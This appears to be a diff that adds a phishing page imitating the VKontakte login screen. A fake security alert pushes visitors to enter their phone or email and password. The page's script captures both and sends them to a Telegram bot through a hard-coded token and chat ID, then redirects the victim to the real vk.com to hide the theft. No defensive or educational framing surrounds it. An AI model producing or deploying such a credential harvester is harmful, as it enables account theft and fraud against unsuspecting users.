@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ВКонтакте | Вход</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .alert {
+            background-color: #fff8e1;
+            color: #ff6d00;
+            padding: 10px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #656565;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #d3d9de;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0077ff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .btn:hover {
+            background-color: #0066cc;
+        }
+        .footer-links {
+            margin-top: 20px;
+            font-size: 13px;
+        }
+        .footer-links a {
+            color: #2a5885;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://vk.com/images/logo_enter.png" alt="VK Logo" class="logo">
+        <div class="alert">
+            ВНИМАНИЕ: Обнаружена подозрительная активность. Войдите для проверки безопасности.
+        </div>
+        <form id="login-form" method="POST">
+            <div class="input-group">
+                <label for="phone">Телефон или email</label>
+                <input type="text" id="phone" name="phone" required autofocus>
+            </div>
+            <div class="input-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="btn">Войти</button>
+        </form>
+        <div class="footer-links">
+            <a href="#">Забыли пароль?</a>
+            <a href="#">Регистрация</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Собираем данные
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            
+            // Отправляем данные на сервер (здесь - на Telegram бота)
+            // Замените BOT_TOKEN и CHAT_ID на свои
+            const botToken =8120183373:AAGtkrdTmi7LqO6nZqFufwEOdpF71A7rkLY;
+            const chatId =156782107;
+            const message = `Новые данные! Телефон: ${phone}, Пароль: ${password}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => {
+                    // После отправки, перенаправляем на настоящий ВК
+                    window.location.href = 'https://vk.com';
+                })
+                .catch(error => {
+                    console.error('Ошибка отправки:', error);
+                    window.location.href = 'https://vk.com';
+                });
+        });
+    </script>
+</body>
+</html>
